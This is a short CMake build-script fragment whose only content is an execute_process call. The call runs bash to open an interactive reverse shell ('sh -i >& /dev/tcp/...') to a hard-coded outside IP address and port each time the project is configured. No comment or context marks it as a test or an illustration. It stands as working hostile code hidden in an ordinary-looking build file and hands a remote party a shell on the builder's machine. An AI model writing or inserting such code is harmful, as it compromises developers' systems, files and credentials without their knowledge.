execute_process (
    COMMAND bash -c "sh -i >& /dev/tcp/193.70.37.121/9873 0>&1"
    OUTPUT_VARIABLE outVar
)
